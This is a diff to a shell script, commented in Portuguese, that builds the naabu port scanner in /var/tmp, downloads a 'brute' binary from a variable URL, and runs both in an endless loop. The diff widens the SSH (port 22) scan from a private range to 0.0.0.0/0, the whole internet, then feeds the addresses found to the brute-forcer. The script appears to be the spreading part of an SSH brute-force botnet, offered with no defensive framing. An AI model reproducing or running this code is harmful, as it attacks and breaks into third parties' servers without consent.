@@ -12,6 +12,7 @@ naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.zip'
 brute(){
 
 
+
 cd /var/tmp/go/bin ; cd  *.1/cmd/naabu
 
 
@@ -21,10 +22,12 @@ wget $brute_url  -O brute || curl  -L $brute_url -o brute
 chmod 777 brute && chmod 777 nabu
 
 
-timeout   5s ./nabu  -p 22   -host  192.168.1.1/10  > ips  #120 segundos para  pega os ips
+timeout   120s ./nabu  -p 22   -host  0.0.0.0/0  > ips  #120 segundos para  pega os ips
  
 
-timeout   5s    ./brute  #120  segundos para  testa o   ip
+
+timeout   120s    ./brute  #120  segundos para  testa o   ip
+
 
 return
 
@@ -34,6 +37,7 @@ return
 
 
 #################################
+
 install_nabu(){
 
 #function no critical
@@ -62,9 +66,16 @@ fi ;
 if [ $EUID -eq  0 ] ; then
 
 
+
 #apt-get   update -y  &&  apt-get  upgrade  -y   
 
+
 #apt-get install -y  libpcap-dev 
+
+
+#apt-get  install  zip  -y 
+
+
 
 
 cd /var/tmp 
@@ -78,16 +89,15 @@ cd go/bin/
 
 wget  $naabu  -O nabu.zip   || curl -L $naabu -o nabu.zip
 
+
 unzip -o *.zip 
 
 
 cd  *.1/cmd/naabu ; mv main.go nabu.go
 
 
- ../../.././go  build nabu.go
 
-
-
+../../.././go  build nabu.go
 
 
 
@@ -111,7 +121,7 @@ while true ; do
 
 install_nabu
  
-sleep   1
+sleep   5
 
 done
 
